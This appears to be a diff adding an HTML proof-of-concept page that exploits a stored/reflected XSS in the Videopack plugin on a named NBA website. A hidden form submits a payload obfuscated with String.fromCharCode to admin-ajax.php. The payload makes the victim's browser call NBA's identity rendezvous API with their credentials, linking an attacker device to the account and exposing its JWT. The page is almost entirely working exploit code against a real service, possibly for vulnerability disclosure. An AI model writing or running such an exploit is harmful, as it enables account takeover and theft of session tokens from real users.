@@ -1,0 +1,150 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NBA rendezvous account-token PoC</title>
+<style>
+  body { font: 16px/1.45 system-ui, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 20px; }
+  label, button, textarea, input { display: block; width: 100%; box-sizing: border-box; margin: 10px 0; }
+  input, textarea, button { font: inherit; padding: 10px; }
+  textarea { min-height: 130px; }
+  button { cursor: pointer; }
+  code { overflow-wrap: anywhere; }
+  .muted { color: #555; }
+  .ok { color: #075; }
+</style>
+
+<h1>NBA rendezvous account-token PoC</h1>
+<p>This page triggers the confirmed Videopack XSS, links an attacker device to the logged-in controlled NBA ID, and helps display the returned JWT.</p>
+
+<h2>1. Generate attacker code</h2>
+<label>Attacker device ID
+  <input id="device" autocomplete="off">
+</label>
+<p>Run this command, then paste the returned six-character code below:</p>
+<code id="generateCommand"></code>
+<button id="copyCommand" type="button">Copy generation command</button>
+
+<h2>2. Trigger account link</h2>
+<label>Six-character rendezvous code
+  <input id="code" maxlength="6" autocomplete="off">
+</label>
+<button id="trigger" type="button">Trigger Videopack XSS</button>
+<p id="triggerStatus" class="muted"></p>
+
+<h2>3. Retrieve and display JWT</h2>
+<a id="poll" href="#" target="_blank" rel="noopener">Open attacker polling response</a>
+<p class="muted">Copy the JSON response, return here, and paste it below. The page does not store or transmit the pasted value.</p>
+<textarea id="tokenInput" autocomplete="off" spellcheck="false" placeholder="Paste the polling JSON response or JWT"></textarea>
+<button id="showToken" type="button">Alert and copy full JWT</button>
+<p id="tokenStatus" class="muted"></p>
+
+<form id="poc" method="post" enctype="multipart/form-data"
+      action="https://videorulebook.nba.com/wp-admin/admin-ajax.php"
+      target="nba_rendezvous_exploit" hidden>
+  <input name="action" value="kgvid_switch_gallery_page">
+  <input name="security" value="8df5c8250d">
+  <input name="page" value="1">
+  <input name="last_video_id" value="0">
+  <input name="query_atts[gallery_orderby]" value="menu_order">
+  <input name="query_atts[gallery_order]" value="ASC">
+  <input name="query_atts[gallery_per_page]" value="1">
+  <input name="query_atts[gallery_id]" value="0">
+  <input name="query_atts[gallery_exclude]" value="">
+  <input name="query_atts[gallery_include]" value="3427">
+  <input id="galleryThumb" name="query_atts[gallery_thumb]" value="250">
+  <input name="query_atts[caption]" value="">
+  <input name="query_atts[skin]" value="">
+  <input name="query_atts[gallery_end]" value="close">
+  <input name="query_atts[gallery_title]" value="false">
+</form>
+
+<script>
+  const device = document.getElementById("device");
+  const code = document.getElementById("code");
+  const generateCommand = document.getElementById("generateCommand");
+  const poll = document.getElementById("poll");
+  const params = new URLSearchParams(location.search);
+
+  device.value = params.get("device") || crypto.randomUUID();
+  code.value = params.get("code") || "";
+
+  function refreshLinks() {
+    const deviceId = encodeURIComponent(device.value.trim());
+    const rendezvousCode = encodeURIComponent(code.value.trim());
+    generateCommand.textContent = `curl -s "https://identity.nba.com/api/v1/devices/${deviceId}/codes"`;
+    poll.href = `https://identity.nba.com/api/v1/devices/${deviceId}/codes/${rendezvousCode}`;
+  }
+
+  function charCodeExpression(value) {
+    return `String.fromCharCode(${Array.from(value, character => character.charCodeAt(0)).join(",")})`;
+  }
+
+  function exploitPayload(rendezvousCode) {
+    const endpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
+    const post = charCodeExpression("POST");
+    const include = charCodeExpression("include");
+    const contentType = charCodeExpression("Content-Type");
+    const textPlain = charCodeExpression("text/plain");
+    const codeValue = charCodeExpression(rendezvousCode);
+    const fetchName = charCodeExpression("fetch");
+    const handler = `top[${fetchName}](${endpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:JSON.stringify({code:${codeValue}})})`;
+    return `250\"><details open ontoggle='${handler}'>`;
+  }
+
+  function findJwt(value) {
+    if (typeof value === "string" && /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(value)) return value;
+    if (Array.isArray(value)) {
+      for (const item of value) {
+        const found = findJwt(item);
+        if (found) return found;
+      }
+    } else if (value && typeof value === "object") {
+      for (const item of Object.values(value)) {
+        const found = findJwt(item);
+        if (found) return found;
+      }
+    }
+    return null;
+  }
+
+  device.addEventListener("input", refreshLinks);
+  code.addEventListener("input", refreshLinks);
+
+  document.getElementById("copyCommand").addEventListener("click", async () => {
+    await navigator.clipboard.writeText(generateCommand.textContent);
+  });
+
+  document.getElementById("trigger").addEventListener("click", () => {
+    const rendezvousCode = code.value.trim();
+    if (!/^[A-Za-z0-9]{6}$/.test(rendezvousCode)) {
+      document.getElementById("triggerStatus").textContent = "Enter the six-character code first.";
+      return;
+    }
+    document.getElementById("galleryThumb").value = exploitPayload(rendezvousCode);
+    window.open("about:blank", "nba_rendezvous_exploit");
+    document.getElementById("poc").submit();
+    document.getElementById("triggerStatus").className = "ok";
+    document.getElementById("triggerStatus").textContent = "Exploit request opened. Poll the attacker device after it finishes.";
+  });
+
+  document.getElementById("showToken").addEventListener("click", async () => {
+    const input = document.getElementById("tokenInput").value.trim();
+    let jwt = null;
+    try {
+      jwt = findJwt(JSON.parse(input));
+    } catch {
+      jwt = findJwt(input);
+    }
+    if (!jwt) {
+      document.getElementById("tokenStatus").textContent = "No JWT found in pasted value.";
+      return;
+    }
+    await navigator.clipboard.writeText(jwt);
+    document.getElementById("tokenInput").value = "";
+    alert(jwt);
+    document.getElementById("tokenStatus").className = "ok";
+    document.getElementById("tokenStatus").textContent = "Full JWT displayed and copied. Nothing was stored.";
+  });
+
+  refreshLinks();
+</script>
